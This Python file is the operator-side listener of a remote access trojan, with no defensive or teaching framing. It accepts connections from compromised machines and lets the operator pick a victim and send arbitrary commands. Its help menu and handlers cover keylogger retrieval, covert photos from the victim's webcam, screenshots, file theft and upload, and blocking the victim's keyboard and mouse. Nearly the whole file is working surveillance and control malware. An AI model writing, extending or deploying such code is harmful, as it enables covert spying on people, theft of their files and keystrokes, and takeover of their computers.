import socket, json, subprocess, os
import base64
import sys
import threading
from termcolor import colored

def UkDecode(text):
	text = text.decode("cp866")
	for i in range(len(text) - 1):
		if text[i] == "?":
			text = text[:i] + "і" + text[i+1:]
	return text



class Listener:

	def __init__(self, ip, port):
		self.connections = []

		self.listener = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		self.listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
		self.listener.bind((ip, port))

		self.chosen_connection = None
		self.do_listen = True

		print(colored("[+] Waiting for incoming connections", "green"))


	def listen(self):
		if self.do_listen:
			try:
				self.listener.listen(0)
				connection, address = self.listener.accept()
				print(colored("\n[+] Got a connection from " + str(address), "green"))
				print("# Press Enter")
				self.connections.append((connection, address))
				self.listen()
			except: pass


	def reliable_send(self, data):
		json_data = json.dumps(data)
		if data == "exit":
			for con in self.connections:
				con[0].send(json_data.encode())
		elif self.chosen_connection:
			self.chosen_connection[0].send(json_data.encode())
		else:
			print(colored("[-] You didn't choose any connection yet", "red"))


	def reliable_recive(self):
		json_data = ""
		while True:
			try:
				if self.chosen_connection:
					json_data += self.chosen_connection[0].recv(1024).decode()
					return json.loads(json_data)
				else:
					return ""
			except: continue


	def write_file(self, path, content):
		content = base64.b64decode(content)
		with open(path, "wb") as file:
			file.write(content)
			print(f"[+] You can see your file as {path}")


	def read_file(self, path):
		file = open(path, "rb").read()
		file = base64.encodebytes(file).decode()
		return file


	def execute_remotely(self, command):
		try:
			self.reliable_send(command)
			return self.reliable_recive()
		except:
			return "[-] This client has been disconnected"


	def get_connections(self):
		return self.connections


	def exit(self):
		self.do_listen = False
		connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		connection.connect((IP, PORT))
		self.listener.close()


	def run(self):
		while True:
			if self.chosen_connection:
				user = self.chosen_connection[1][0]
				command = input(f"{user} # ")
			else: command = input(">>> ")

			if command == "print":
				connections = self.get_connections()
				if connections:
					for con in self.get_connections():
						print(con[1])
				else:
					print(colored("[-] You don't have any connection yet", "red"))

			elif command == "choose":
				connections = self.get_connections()
				if connections:
					for con in range(len(connections)):
						connection = connections[con][1]
						print(f"{str(con+1)}. {connection}")
					chosen = input("Enter number of connection: ")
					if not chosen.isdigit():
						print(colored("[~] You must to enter number!", "yellow"))
					elif int(chosen) <= len(connections):
						chosen = int(chosen)
						self.chosen_connection = connections[chosen - 1]
						print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
					else:
						print(colored("[-] This connection does not exist!"))
				else:
					print(colored("[-] You don't have any connection yet", "red"))

			elif command == "chosen":
				if self.chosen_connection:
					print(colored("[+] Chosen connection: " + str(self.chosen_connection[1]), "green"))
				else:
					print(colored("[-] You didn't choose any connection yet", "red"))

			elif command == "help":
				help_message = colored("\n Type 'help' to see it\n\n", "yellow")
				help_message += colored(" print", "green") + " - show all connections;\n"
				help_message += colored(" choose", "green") + " - choose connection;\n"
				help_message += colored(" l ls", "green") + " - execute ls on own machine;\n"
				help_message += colored(" get keys", "green") + " - get all records from keylogger;\n"
				help_message += colored(" camera", "green") + " - Take photo from victim's camera;\n"
				help_message += colored(" screen", "green") + " - Take screenshot from victim's screen;\n"
				help_message += colored(" upload <filename>", "green") + " - upload file to victim's machine;\n"
				help_message += colored(" download <filename>", "green") + " - download file from victim's machine;\n"
				help_message += colored(" keyboard false", "green") + " - block keyboard;\n"
				help_message += colored(" keyboard true", "green") + " - unblock keyboard;\n"
				help_message += colored(" mouse false", "green") + " - block mouse;\n"
				help_message += colored(" mouse true", "green") + " - unblock mouse;\n"
				help_message += colored(" play music", "green") + " - play music;\n"
				help_message += colored(" volume <negative number>", "green") + " - set volume;\n"
				help_message += colored(" exit", "red") + " - stop the program;\n"
				print(help_message)

			elif command == "exit":
				self.exit()
				self.execute_remotely("exit")
				break

			elif command == "camera":
				if self.chosen_connection:
					res = self.execute_remotely("camera")
					if res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						self.write_file("one.jpg", res)
				else: print(colored("[~] You have to choose one device", "yellow"))

			elif command.strip() == "screen" or command.strip() == "screenshot":
				if self.chosen_connection:
					res = self.execute_remotely("screen")
					if res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						self.write_file("scr.jpg", res)
				else: print(colored("[~] You have to choose one device", "yellow"))

			elif command.strip() and command.split()[0] == "download":
				if self.chosen_connection:
					file = command.replace("download", "").strip()
					res = self.execute_remotely(command)
					if res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						self.write_file(file, res)
				else: print(colored("[~] You have to choose one device", "yellow"))


			elif command.strip() and command.split()[0] == "upload":
				if self.chosen_connection:
					file_name = command.replace("upload", "").strip()
					if os.path.exists(file_name):
						file = self.read_file(file_name)
						res = self.execute_remotely(f"upload {file_name}, {file}")
						if res.split()[0] != "[-]": print(colored(res, "green"))
						else: print(colored(res, "red"))
					else:
						print(colored("[-] This file is not exists", "red"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command.strip() and command.split()[0] == "l" and command.split()[1] == "ls":
				try: res = UkDecode(subprocess.check_output("ls", shell = True))
				except: res = UkDecode(subprocess.check_output("dir", shell = True))
				print(res)

			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "mouse":
				if self.chosen_connection:
					result = self.execute_remotely(command)
					if result.split()[0] == "[-]":
						print(colored(result, "red"))
					else:
						print(colored(result, "green"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command.strip() and len(command.split()) == 2 and command.split()[0] == "keyboard":
				if self.chosen_connection:
					result = self.execute_remotely(command)
					if result.split()[0] == "[-]":
						print(colored(result, "red"))
					else:
						print(colored(result, "green"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command == "get keys":
				if self.chosen_connection:
					res = self.execute_remotely(command)
					if res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						self.write_file("logs.txt", res)
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command.startswith("play music"):
				if self.chosen_connection:
					res = self.execute_remotely(command)
					if res.split()[0] == "[-]": 
						print(colored(res, "red"))
					elif res.split()[0] == "[~]":
						print(colored(res, "yellow"))
					else:
						print(colored(res, "green"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command.strip() and command.split()[0] == "volume":
				if self.chosen_connection:
					try:
						float(command.split()[1])
						res = self.execute_remotely(command)
						if res.split()[0] == "[+]":
							print(colored(res, "green"))
						else:
							print(colored(res, "red"))
					except: print(colored("[-] Wrong arugument", "red"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command.strip() and command.split()[0] == "async" and command.replace("async", "").strip():
				if self.chosen_connection:
					res = self.execute_remotely(command)
					if res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						print(colored(res, "green"))
				else: print(colored("[-] You didn't choose any connection yet", "red"))

			elif command == "window":
				res = self.execute_remotely(command)
				print(res)

			elif command == "close window":
				res = self.execute_remotely(command)
				print(res)

			elif len(command.split()):
				if self.chosen_connection:
					res = self.execute_remotely(command)
					if res.strip() and res.split()[0] == "[-]":
						print(colored(res, "red"))
					else:
						print(res)

				else: print(colored("[-] You didn't choose any connection yet", "red"))



if __name__ == "__main__":
	from config import IP, PORT
	listener = Listener(IP, PORT)

	listen_thread = threading.Thread(target=listener.listen)
	listen_thread.start()

	listener.run()
	# listen_thread.join()
	# listener.listener.close()